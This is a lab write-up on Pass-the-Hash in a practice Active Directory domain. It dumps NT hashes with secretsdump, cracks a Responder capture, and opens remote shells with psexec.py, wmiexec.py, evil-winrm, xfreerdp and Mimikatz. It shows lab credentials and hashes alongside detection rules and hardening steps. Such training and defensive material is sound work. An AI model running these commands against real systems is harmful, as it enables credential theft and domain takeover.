# 06 — Pass-the-Hash (PtH)

> **Lab:** INLANEFREIGHT.LOCAL · DC: `172.16.5.5` (ACADEMY-EA-DC01) · File server: `172.16.5.125` (ACADEMY-EA-FILE) · Attack host: `172.16.5.225` (Kali Linux, interface `ens224`)  
> **MITRE ATT&CK:** [T1550.002 — Use Alternate Authentication Material: Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)  
> **Difficulty:** Medium · **Impact:** Lateral Movement → Privilege Escalation → Domain Compromise

---

## Table of Contents

1. [Overview](#1-overview)
2. [Root Cause Analysis](#2-root-cause-analysis)
3. [Prerequisites](#3-prerequisites)
4. [Lab Environment](#4-lab-environment)
5. [Attack Chain](#5-attack-chain)
6. [Phase 1 — Obtain NTLM Hash](#6-phase-1--obtain-ntlm-hash)
7. [Phase 2 — Pass-the-Hash via SMB (CrackMapExec/NetExec)](#7-phase-2--pass-the-hash-via-smb-crackmapexecnetexec)
8. [Phase 3 — Remote Shell via psexec.py](#8-phase-3--remote-shell-via-psexecpy)
9. [Phase 4 — Remote Shell via wmiexec.py](#9-phase-4--remote-shell-via-wmiexecpy)
10. [Phase 5 — PTH via WinRM (evil-winrm)](#10-phase-5--pth-via-winrm-evil-winrm)
11. [Phase 6 — PTH via RDP (xfreerdp)](#11-phase-6--pth-via-rdp-xfreerdp)
12. [Phase 7 — Windows-Side PTH (Mimikatz sekurlsa::pth)](#12-phase-7--windows-side-pth-mimikatz-sekurlsapth)
13. [UAC Remote Restrictions](#13-uac-remote-restrictions)
14. [Validation](#14-validation)
15. [Detection](#15-detection)
16. [Hardening](#16-hardening)
17. [References](#17-references)

---

## 1. Overview

Pass-the-Hash (PtH) is a lateral movement technique that exploits how NTLM authentication works in Windows networks. Rather than cracking a captured NTLM hash to obtain the plaintext password, an attacker uses the **hash directly as the credential** to authenticate to remote services.

This is not a vulnerability in the traditional sense — it is a consequence of how NTLM authentication was designed. The NTLM protocol uses a challenge-response mechanism where the client proves knowledge of the password by computing an HMAC using the NT hash. The hash **is** the credential.

PtH is a foundational lateral movement technique. Once a single local admin hash is obtained from any host, it may be reused across dozens or hundreds of machines in environments where local admin passwords are not rotated (no LAPS deployment).

---

## 2. Root Cause Analysis

```
NTLM AUTHENTICATION — NORMAL FLOW
────────────────────────────────────────────────────────────────
Client                                    Server
  │                                          │
  ├── NEGOTIATE_MESSAGE ────────────────────►│
  │                                          │
  │◄── CHALLENGE_MESSAGE (nonce) ───────────┤
  │                                          │
  │  NTLMv2 response derivation:
  │    ResponseKeyNT = HMAC-MD5(NT_hash, UTF-16LE(upper(username) + domain))
  │    NTProofStr    = HMAC-MD5(ResponseKeyNT, server_challenge + client_blob)
  │    NT_response   = NTProofStr + client_blob
  │                                          │
  ├── AUTHENTICATE_MESSAGE ─────────────────►│
  │   (NT_response computed using NT_hash)   │
  │                                          │
  │◄── authenticated ───────────────────────┤

PASS-THE-HASH
────────────────────────────────────────────────────────────────
Attacker (has NT_hash, not plaintext)
  │
  └── Supplies NT_hash to NTLM computation instead of deriving it
      from a password → produces valid NT_response
      → authenticated
```

**Why this works:** The NT hash IS the NTLM credential. The server verifies the HMAC using the stored NT hash — there is no step where the plaintext password is required.

**Hash formats encountered in the field:**

| Format | Example | Source |
|---|---|---|
| NT hash only | `88ad09182de639ccc6579eb0849751cf` | NTDS.dit, secretsdump, hashdump |
| LM:NT format | `aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf` | Impacket `-hashes` parameter |
| NTLMv2 response | `username::domain:challenge:response:...` | Network capture (Responder) |

> **Note:** NTLMv2 hashes (network captures) CANNOT be passed directly — they must be cracked first. Only NT hashes (from SAM/NTDS.dit/LSASS) can be passed.

---

## 3. Prerequisites

| Requirement | Detail |
|---|---|
| **NT hash source** | SAM dump, NTDS.dit, LSASS dump, secretsdump output |
| **Target access** | Local admin rights on target host, or domain admin using hash |
| **Tools (Linux)** | `impacket-psexec`, `impacket-wmiexec`, `evil-winrm`, `crackmapexec`/`netexec`, `xfreerdp` |
| **Tools (Windows)** | `mimikatz.exe`, `Invoke-TheHash`, PsExec |
| **Ports** | SMB: TCP 445, 139 · WinRM: TCP 5985 · RDP: TCP 3389 |
| **UAC restriction** | Local admin non-RID-500 accounts may be blocked by UAC remote restriction |

---

## 4. Lab Environment

```
┌──────────────────────────────────────────────────────────────────┐
│  INLANEFREIGHT.LOCAL                                             │
│                                                                  │
│  ACADEMY-EA-DC01:   172.16.5.5                                   │
│  ACADEMY-EA-FILE:   172.16.5.125  ← target for lateral move      │
│  ACADEMY-EA-MS01:   172.16.5.130                                 │
│                                                                  │
│  Credentials obtained:                                           │
│    wley          password: transporter@4                         │
│    forend        password: Klmcargo2 (NTLM: captured)            │
│    administrator NT hash: 88ad09182de639ccc6579eb0849751cf       │
│                                                                  │
│  Attack host: 172.16.5.225 (Kali) ens224                         │
└──────────────────────────────────────────────────────────────────┘
```

---

## 5. Attack Chain

```
┌─────────────────────────────────────────────────────────────────────────┐
│                       PASS-THE-HASH CHAIN                               │
└─────────────────────────────────────────────────────────────────────────┘

[1] OBTAIN HASH          [2] IDENTIFY TARGETS     [3] LATERAL MOVE
──────────────────       ────────────────────     ──────────────────────
secretsdump.py       →   CME/netexec smb      →   psexec.py -hashes
  or Responder             --local-auth            wmiexec.py -hashes
  or LSASS dump            (find valid hosts)      evil-winrm -H
  or SAM dump                                      xfreerdp /pth:
                                │                  
                     [4] ENUMERATE              [5] ESCALATE
                     ──────────────────         ──────────────────────
                     Check group membership  →  DCSync if DA hash
                     BloodHound analysis        NTDS.dit dump
                     Shares, sessions           Golden Ticket
                     Spider_plus                Full domain compromise
```

---

## 6. Phase 1 — Obtain NTLM Hash

### 6.1 From Responder (NTLMv2 — Must Crack First)

Captured during LLMNR poisoning (see Attack 01):

```
FOREND::INLANEFREIGHT:32FD89BD78804B04:DFEB0C724F3ECE90E42BAF061B78BFE2:010100000000000080F519D1432CD80100000000020008004900340046004E0001001E00570049004E002D0032004E004C005100420057004D00310054005000490004003400570049004E002D0032004E004C005100420057004D0031005400500049002E004900340046004E002E004C004F00430041004C0006001E004900340046004E002E004C004F00430041004C0007000800BF5319D1432CD80100000000
```

Crack with hashcat mode 5600:

```bash
Hackerpatel007_1@htb[/htb]$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

```
...
FOREND::INLANEFREIGHT:32fd89bd78804b04:dfeb0c724f3ece90e42baf061b78bfe2:010100000000000080f519d1432cd80100000000020008004900340046004e0001001e00570049004e002d0032004e004c005100420057004d00310054005000490004003400570049004e002d0032004e004c005100420057004d0031005400500049002e004900340046004e002e004c004f00430041004c0006001e004900340046004e002e004c004f00430041004c0007000800bf5319d1432cd80100000000:Klmcargo2

Status.......: Cracked
```

**Result:** `forend:Klmcargo2` (plaintext — now we can get the NT hash)

### 6.2 From secretsdump.py (Local SAM or Remote NTDS)

```bash
Hackerpatel007_1@htb[/htb]$ secretsdump.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

```
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/wley:$DCC2$10240#wley#e4ad93ca07acfe99e6de68e34e8b80f3
...
```

**Analysis:**
- `wley` has local admin on `ACADEMY-EA-FILE` (172.16.5.125)
- Local `Administrator:500` NT hash extracted: `7facdc498ed1680c4fd1448319a8c04a`
- LM hash is `aad3b435b51404eeaad3b435b51404ee` — this is a blank LM hash (always present on modern systems)

### 6.3 From NTDS.dit (Domain Controller — Full Domain Dump)

```bash
Hackerpatel007_1@htb[/htb]$ secretsdump.py inlanefreight.local/wley:'transporter@4'@172.16.5.5 -just-dc-ntlm
```

```
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
...
```

**Key hash captured:** `administrator:88ad09182de639ccc6579eb0849751cf`

---

## 7. Phase 2 — Pass-the-Hash via SMB (CrackMapExec/NetExec)

### 7.1 Validate the Hash Against a Single Host

```bash
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

```
SMB         172.16.5.5      445    ACADEMY-EA-DC01 [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

**Analysis:**
- `-H` accepts the NT hash directly — no LM portion required
- `(Pwn3d!)` = local admin access confirmed on this host
- SMB signing is True on the DC — prevents relay attacks but does not prevent direct PTH

### 7.2 Spray the Local SAM Hash Across Member Hosts

The local Administrator hash extracted from the member server (`7facdc498ed1680c4fd1448319a8c04a`) tests for **local account password reuse** across other member hosts. Use `--local-auth` and target member hosts explicitly — do **not** scan the full subnet. Domain Controllers do not have an equivalent local SAM Administrator account; including the DC in a local-auth sweep produces noise and is irrelevant to this test.

```bash
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 172.16.5.50 172.16.5.125 172.16.5.130 -u administrator -H 7facdc498ed1680c4fd1448319a8c04a --local-auth
```

> **Target scope:** Use an explicit list of member host IPs rather than a subnet range (`172.16.5.0/24`). The /24 includes the Domain Controller (`172.16.5.5`); a local-auth sweep against the DC is a pointless request that generates log noise without meaningful results. Enumerate member hosts from DNS, LDAP, or prior host discovery output and pass them explicitly.

```
SMB         172.16.5.125    445    ACADEMY-EA-FILE [*] Windows 10.0 Build 17763 x64...
SMB         172.16.5.125    445    ACADEMY-EA-FILE [+] .\administrator 7facdc498ed1680c4fd1448319a8c04a (Pwn3d!)
SMB         172.16.5.130    445    ACADEMY-EA-MS01 [*] Windows 10.0 Build 17763 x64...
SMB         172.16.5.130    445    ACADEMY-EA-MS01 [+] .\administrator 7facdc498ed1680c4fd1448319a8c04a (Pwn3d!)
SMB         172.16.5.50     445    SOMEHOST        [*] ...
SMB         172.16.5.50     445    SOMEHOST        [-] .\administrator 7facdc498ed1680c4fd1448319a8c04a STATUS_LOGON_FAILURE
```

**Analysis:**
- `--local-auth` tests the hash as a **local account** credential on each host — this is the right flag for SAM hash reuse testing
- Domain Controller excluded — this test targets local SAM accounts on member hosts only
- Two member hosts confirmed local admin access — demonstrates that the same local Administrator password is reused across the environment (a common finding)
- Hosts returning `STATUS_LOGON_FAILURE` have a different local password

**Testing domain credentials is a separate operation:**

```bash
# Domain Administrator hash — authenticate as domain account (no --local-auth)
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

| Test | Hash | Flag | Scope |
|---|---|---|---|
| Local account password reuse | `7facdc...` (SAM) | `--local-auth` | Member hosts only |
| Domain Administrator access | `88ad09...` (NTDS) | *(no --local-auth)* | DC and domain members |

### 7.3 Execute Commands Remotely via CME

```bash
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 172.16.5.125 -u administrator -H 7facdc498ed1680c4fd1448319a8c04a -x "whoami"
```

```
SMB         172.16.5.125    445    ACADEMY-EA-FILE [*] Windows 10.0 Build 17763 x64...
SMB         172.16.5.125    445    ACADEMY-EA-FILE [+] .\administrator:7facdc498ed1680c4fd1448319a8c04a (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-FILE [+] Executed command
SMB         172.16.5.125    445    ACADEMY-EA-FILE nt authority\system
```

---

## 8. Phase 3 — Remote Shell via psexec.py

```bash
Hackerpatel007_1@htb[/htb]$ psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

```
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 172.16.5.125.....
[*] Found writable share ADMIN$
[*] Uploading file sRhFLBbo.exe
[*] Opening SVCManager on 172.16.5.125.....
[*] Creating service KQWG on 172.16.5.125.....
[*] Starting service KQWG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.5830]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

**Analysis:**
- psexec.py requires writable `ADMIN$` share access (local admin on target)
- Drops a randomly-named executable to `ADMIN$`
- Communicates over a named pipe — provides an interactive command shell on the target, running as SYSTEM (service-based execution; not a reverse shell in the traditional sense)
- Generates Windows Service creation events (Event ID 7045) — easily detected
- Lands as SYSTEM, not as the user credential supplied

### 8.1 PTH with psexec.py Using Hash Directly

Impacket tools accept the `-hashes` flag in `LM:NT` format (LM portion can be blank):

```bash
Hackerpatel007_1@htb[/htb]$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04a \
  inlanefreight.local/administrator@172.16.5.125
```

```
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 172.16.5.125.....
[*] Found writable share ADMIN$
[*] Uploading file OiTkFLBo.exe
[*] Opening SVCManager on 172.16.5.125.....
[*] Creating service TQSC on 172.16.5.125.....
[*] Starting service TQSC.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.5830]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

**Format explanation:**
```
-hashes <LMhash>:<NThash>
         │           │
         │           └── The NT hash — this is what actually authenticates
         └────────────── LM hash — blank LM = aad3b435b51404eeaad3b435b51404ee
```

---

## 9. Phase 4 — Remote Shell via wmiexec.py

```bash
Hackerpatel007_1@htb[/htb]$ wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

```
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
inlanefreight\wley
```

**Analysis:**
- Executes commands through WMI rather than creating a service
- Does not create the service executable used by `psexec.py`. However, the default Impacket implementation redirects command output to a temporary file on the target's `ADMIN$` share, retrieves it over SMB, and deletes it after collection — a temporary file artifact is created on the target during command execution
- Runs as the credential supplied (wley), not SYSTEM
- Each command spawns a new `cmd.exe` process via WMI — this can appear in two independent logging channels:
  - **Windows Security Event 4688** (Process Creation): generated when "Audit Process Creation" is enabled under Advanced Audit Policy — not enabled by default
  - **Sysmon Event 1** (Process Create): generated when Sysmon is deployed with a process-creation rule — a separate logging system that does not produce Event 4688; Sysmon Event 10 (Process Access) is the equivalent for LSASS access
  These are independent sources; enabling one does not enable the other
- Semi-interactive — no stdin; each command is a one-shot WMI call

### 9.1 PTH with wmiexec.py Using Hash

```bash
Hackerpatel007_1@htb[/htb]$ wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf \
  inlanefreight.local/administrator@172.16.5.5
```

```
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
inlanefreight\administrator

C:\>hostname
ACADEMY-EA-DC01
```

**Comparison with psexec.py:**

| Attribute | psexec.py | wmiexec.py |
|---|---|---|
| **Files dropped** | Yes (ADMIN$ service binary) | Temporary (output file on ADMIN$, deleted after retrieval) |
| **Service created** | Yes (Event ID 7045) | No |
| **Shell context** | SYSTEM | Credential supplied |
| **Detection noise** | High | Different telemetry profile; not inherently stealthier (WMI, process creation, and SMB events still fire) |
| **Interactivity** | Interactive | Semi-interactive |
| **Port used** | TCP 445 | TCP 445 (output), WMI |

---

## 10. Phase 5 — PTH via WinRM (evil-winrm)

### 10.1 Connect Using Password

```bash
Hackerpatel007_1@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend
Enter Password: Klmcargo2

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation...

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents> hostname
ACADEMY-EA-MS01
```

### 10.2 Connect Using NT Hash (Pass-the-Hash)

```bash
Hackerpatel007_1@htb[/htb]$ evil-winrm -i 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

```
Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation...

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
inlanefreight\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
ACADEMY-EA-DC01
```

**Analysis:**
- `-H` flag accepts the NT hash directly — no LM portion needed
- evil-winrm handles NTLM hash authentication transparently
- The shell runs as the authenticated user, not SYSTEM
- WinRM (TCP 5985) must be enabled on the target — check with `netexec winrm`

### 10.3 Verify WinRM Availability First

```bash
Hackerpatel007_1@htb[/htb]$ crackmapexec winrm 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

```
WINRM       172.16.5.5      5985   ACADEMY-EA-DC01 [*] Windows 10 / Server 2019 Build 17763 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL)
WINRM       172.16.5.5      5985   ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\administrator:88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

---

## 11. Phase 6 — PTH via RDP (xfreerdp)

RDP PTH requires Restricted Admin Mode to be enabled on the target. When enabled, RDP performs a network logon (no credential caching) — which accepts an NT hash in place of a password.

### 11.1 Check Restricted Admin Mode

```cmd
C:\htb> reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
```

```
# If the key doesn't exist or value is 1: Restricted Admin Mode is DISABLED
ERROR: The system was unable to find the specified registry key or value.
```

```cmd
# Enable Restricted Admin Mode (requires local admin)
C:\htb> reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
```

### 11.2 Pass-the-Hash via RDP from Linux

```bash
Hackerpatel007_1@htb[/htb]$ xfreerdp /u:administrator /pth:88ad09182de639ccc6579eb0849751cf \
  /d:inlanefreight.local /v:172.16.5.5
```

```
[13:11:55:443] [84886:84887] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[13:11:55:444] [84886:84887] [WARN][com.freerdp.crypto] - CN = ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
...
```

The RDP GUI session opens authenticating with the NT hash directly.

**When proxychains is required (pivot scenario):**

```bash
Hackerpatel007_1@htb[/htb]$ proxychains4 -q xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB \
  /d:inlanefreight.local /v:172.20.0.52
```

---

## 12. Phase 7 — Windows-Side PTH (Mimikatz sekurlsa::pth)

From a Windows attack host or compromised foothold, Mimikatz can inject a hash into a new logon session.

### 12.1 sekurlsa::pth — Inject Hash into New Process

```cmd
C:\htb> mimikatz.exe
```

```
  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( [email protected] )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( [email protected] )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:administrator /domain:INLANEFREIGHT.LOCAL /ntlm:88ad09182de639ccc6579eb0849751cf /run:cmd.exe
```

```
user    : administrator
domain  : INLANEFREIGHT.LOCAL
program : cmd.exe
impers. : no
NTLM    : 88ad09182de639ccc6579eb0849751cf
  |  PID  5560
  |  TID  4288
  |  LSA Process is now R/W
  |  LUID 0 ; 7637805 (00000000:0074a7ad)
  \_ msv1_0   - data copy @ 0000018D18E8E050 : OK !
  \_ kerberos - data copy @ 0000018D19D88590
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000018D19DD4FC8 (32) -> null
```

A new `cmd.exe` window opens running in the security context of `administrator` with the hash injected into the logon session. SMB, RDP, and WinRM connections from this window authenticate as the target account.

### 12.2 Invoke-TheHash (PowerShell Alternative)

```powershell
# Requires Invoke-TheHash module
PS C:\htb> Import-Module .\Invoke-TheHash.psd1

# Execute command remotely using PTH via SMB
PS C:\htb> Invoke-SMBExec -Target 172.16.5.5 -Domain INLANEFREIGHT.LOCAL `
  -Username administrator `
  -Hash 88ad09182de639ccc6579eb0849751cf `
  -Command "net localgroup administrators htb-student /add" -Verbose
```

```
VERBOSE: [+] administrator successfully authenticated on 172.16.5.5
VERBOSE: [+] 172.16.5.5 administrative share is writable
VERBOSE: [+] Service KYGU created on 172.16.5.5
VERBOSE: [+] Service KYGU started on 172.16.5.5
VERBOSE: [+] Service KYGU deleted on 172.16.5.5
```

---

## 13. UAC Remote Restrictions

UAC restricts remote NTLM authentication for local accounts. This is a critical consideration during PTH:

```
┌────────────────────────────────────────────────────────────────┐
│  UAC Remote Restriction Rules                                  │
│                                                                │
│  Domain user with local admin → PTH works                      │
│  Local RID-500 (Administrator) → PTH works                     │
│  Local non-RID-500 admin account → BLOCKED by default *        │
│                                                                │
│  * Default behaviour. When LocalAccountTokenFilterPolicy = 1   │
│    (see registry key below), the restriction is removed and    │
│    local non-RID-500 accounts can authenticate over SMB.       │
│                                                                │
│  Registry key:                                                 │
│  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System│
│  LocalAccountTokenFilterPolicy = 1  (removes the block)        │
│                   = 0  (default — block in effect)             │
└────────────────────────────────────────────────────────────────┘
```

> **LocalAccountTokenFilterPolicy (LTFP):** This registry value is the lever that controls whether non-RID-500 local accounts receive a filtered (restricted) or full access token when authenticating remotely over NTLM. With LTFP = 0 (default), non-RID-500 local admins get a restricted token and cannot access administrative SMB shares — PTH fails. With LTFP = 1, the full token is granted and PTH works. Domain accounts and the built-in local Administrator (RID 500) are never subject to this filtering regardless of LTFP.

**Check if LocalAccountTokenFilterPolicy is set:**

```bash
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 172.16.5.125 -u wley -p 'transporter@4' \
  -M reg_query -o KEYNAME="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" \
  -o VALUENAME="LocalAccountTokenFilterPolicy"
```

**Why domain admin hashes always work:** Domain admin accounts perform a full NTLM authentication through the domain controller — UAC remote filtering does not apply.

---

## 14. Validation

### 14.1 Confirm Authentication with crackmapexec

```bash
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator \
  -H 88ad09182de639ccc6579eb0849751cf
```

```
SMB         172.16.5.5      445    ACADEMY-EA-DC01 [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

### 14.2 Enumerate Domain Admins After PTH

```bash
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator \
  -H 88ad09182de639ccc6579eb0849751cf \
  --groups "Domain Admins"
```

### 14.3 Check Shares and Sensitive Files

```bash
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator \
  -H 88ad09182de639ccc6579eb0849751cf \
  --shares
```

---

## 15. Detection

### 15.1 Event IDs

| Event ID | Location | Description |
|---|---|---|
| **4624** | Security log on the system receiving the network logon (DC in this PtH example) | Successful logon — Type 3 (network) |
| **4625** | Security log on the system receiving the failed logon | Failed logon attempt |
| **4648** | Initiating host | Logon using explicit credentials |
| **7045** | Target host System Log | New service installed (psexec.py indicator) |
| **4688** | Target host Security Log | New process created (wmiexec.py indicator) |

### 15.2 Event 4624 — PTH Indicator

```
EventID:    4624
Logon Type: 3                  ← Network logon
Auth Package: NTLM             ← NTLM authentication used
Process Name: -                ← No process name (network logon)
Workstation: ATTACKER          ← Source workstation name
Source IP: 172.16.5.225        ← Source IP of attacker

Key indicator: NTLM Type 3 logon from an unexpected source IP
               to a privileged account at an unusual time
```

### 15.3 Sigma Detection Rule

```yaml
title: Pass-the-Hash Lateral Movement via NTLM
id: fa0d4a95-af5d-4eff-ab67-2b79c3d5b2cc
status: stable
description: Detects NTLM network logons that may indicate Pass-the-Hash activity
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 3
    AuthenticationPackageName: NTLM
  filter_local:
    IpAddress|startswith:
      - '127.'
      - '::1'
  condition: selection and not filter_local
falsepositives:
  - Legitimate NTLM network logons from known management hosts
level: medium
tags:
  - attack.lateral_movement
  - attack.t1550.002
```

### 15.4 psexec.py-Specific Indicators

```
Event ID 7045 - New service installed
Service Name: <random 4-character uppercase string> (e.g., KQWG, BQTO)
Service File: C:\Windows\<random>.exe
Account: LocalSystem

+ 4624 Logon Type 3 from same source
+ 4688 cmd.exe spawned as SYSTEM from service process
```

---

## 16. Hardening

### 16.1 Immediate Actions

| Control | Implementation |
|---|---|
| **LAPS** | Randomise local admin passwords per host — eliminates lateral movement from one hash |
| **Disable NTLM** | Enable Kerberos-only authentication where possible |
| **Credential Guard** | Isolates specific LSASS credential material in a VSB — protects NTLM hashes and Kerberos TGTs stored in LSASS, preventing their extraction by tools like `mimikatz sekurlsa::logonpasswords`. Microsoft explicitly states that Kerberos service tickets are **not** protected by Credential Guard. An attacker with an NT hash obtained independently (from a database dump, prior breach, or other source) may still attempt Pass-the-Hash over the network using tools that call Windows authentication APIs directly. |
| **Tiered admin model** | Separate accounts for each privilege tier |
| **SMB signing** | Enforce signing — blocks relay (not direct PTH) |

### 16.2 Query Legacy LAPS Passwords via PowerShell

```powershell
# Query legacy LAPS (Microsoft LAPS 1.x) managed passwords
# Attribute: ms-Mcs-AdmPwd  — requires read permission on this attribute
PS C:\htb> Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | 
  Where-Object {$_."ms-Mcs-AdmPwd" -ne $null} | 
  Select-Object Name, "ms-Mcs-AdmPwd"
```

> **Legacy LAPS vs Windows LAPS:** This query uses the `ms-Mcs-AdmPwd` attribute, which is the schema extension added by **legacy Microsoft LAPS** (versions 1.x, deployed as a separate MSI). **Windows LAPS** (available on Windows Server 2019 and Windows Server 2022 with the April 11, 2023 cumulative update, and on supported Windows 10 and Windows 11 versions) uses different attributes: `msLAPS-Password` (unencrypted deployments) and `msLAPS-EncryptedPassword` (encrypted deployments). Querying `ms-Mcs-AdmPwd` will return nothing on systems managed by Windows LAPS. Identify which LAPS variant is deployed before assuming null results mean LAPS is absent.

**Query Windows LAPS (unencrypted deployment):**

```powershell
PS C:\htb> Get-ADComputer -Filter * -Properties msLAPS-Password | 
  Where-Object {$_."msLAPS-Password" -ne $null} | 
  Select-Object Name, "msLAPS-Password"
```

**Query Windows LAPS (encrypted deployment — preferred, handles both variants):**

```powershell
# Requires the LAPS PowerShell module (available after installing LAPS on the management host)
# -AsPlainText decrypts the password if you hold the necessary rights
PS C:\htb> Get-LapsADPassword -Identity ACADEMY-EA-FILE -AsPlainText
```

> `Get-LapsADPassword` handles both `msLAPS-Password` and `msLAPS-EncryptedPassword` transparently. Use it in preference to direct attribute queries for Windows LAPS environments. Encrypted LAPS passwords require Authorized Decryptors group membership or Domain Admin rights to decrypt.

### 16.3 Enable Credential Guard

Requires UEFI + Secure Boot + Virtualization. Deploy via GPO:

```
Computer Configuration → Administrative Templates → System → 
Device Guard → Turn On Virtualization Based Security
  → Enabled
  → Credential Guard Configuration: Enabled with UEFI lock
```

### 16.4 Restrict NTLM Authentication

```
GPO: Computer Configuration → Windows Settings → Security Settings → 
Local Policies → Security Options

Network security: Restrict NTLM: Incoming NTLM traffic = Deny all accounts
Network security: Restrict NTLM: Outgoing NTLM traffic = Deny all
```

> **Note:** Test thoroughly — some applications require NTLM. Use Audit mode first.

### 16.5 Defence Summary

```
┌────────────────────────────────────────────────────────────────────┐
│  PTH DEFENCE PRIORITY                                              │
├────────────────────────────────────────────────────────────────────┤
│  1. LAPS — eliminates the core risk (hash reuse across hosts)      │
│  2. Credential Guard — blocks LSASS credential harvesting          │
│  3. Tiered admin model — limits blast radius                       │
│  4. Alert on NTLM Type-3 logins to privileged accounts            │
